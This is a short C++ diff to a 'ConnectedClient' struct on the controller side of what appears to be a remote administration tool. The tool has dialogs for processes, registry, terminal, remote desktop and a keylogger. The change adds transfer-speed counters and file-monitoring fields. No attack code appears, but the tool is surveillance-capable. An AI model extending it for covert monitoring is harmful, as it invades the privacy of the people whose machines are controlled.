@@ -78,6 +78,15 @@ struct ConnectedClient {
     std::wstring downloadPath;
     unsigned long long totalDownloadSize;
     unsigned long long currentDownloadSize;
+    uint64_t downloadStartTick;
+    uint64_t lastSpeedTick;
+    unsigned long long lastSpeedBytes;
+    uint64_t uploadStartTick;
+    uint64_t lastUploadSpeedTick;
+    unsigned long long lastUploadSpeedBytes;
+    std::vector<std::wstring> fileHistory;
+    bool fileMonitorActive;
+    std::wstring fileMonitorPath;
 
     // 音频播放 (Master端使用)
     HWAVEOUT hWaveOut;
@@ -90,7 +99,7 @@ struct ConnectedClient {
     int backBufferHeight;
 
     ConnectedClient() : clientId(0), connId(0), port(0), active(false), 
-                        lastHeartbeat(0),
+                        lastHeartbeat(0), lastHeartbeatSendTime(0),
                         hProcessDlg(NULL), hModuleDlg(NULL), hNetworkDlg(NULL), hTerminalDlg(NULL),
                         hServiceDlg(NULL), hRegistryDlg(NULL), hDesktopDlg(NULL),
                         hWindowDlg(NULL), hFileDlg(NULL), hKeylogDlg(NULL),
@@ -98,6 +107,9 @@ struct ConnectedClient {
                         isMonitoring(false), info{}, listIndex(-1),
                         hFileDownload(INVALID_HANDLE_VALUE),
                         totalDownloadSize(0), currentDownloadSize(0),
+                        downloadStartTick(0), lastSpeedTick(0), lastSpeedBytes(0),
+                        uploadStartTick(0), lastUploadSpeedTick(0), lastUploadSpeedBytes(0),
+                        fileMonitorActive(false),
                         hWaveOut(NULL), pAudioDecoder(NULL),
                         hScreenBackBuffer(NULL), hBackBufferDC(NULL),
                         backBufferWidth(0), backBufferHeight(0) {
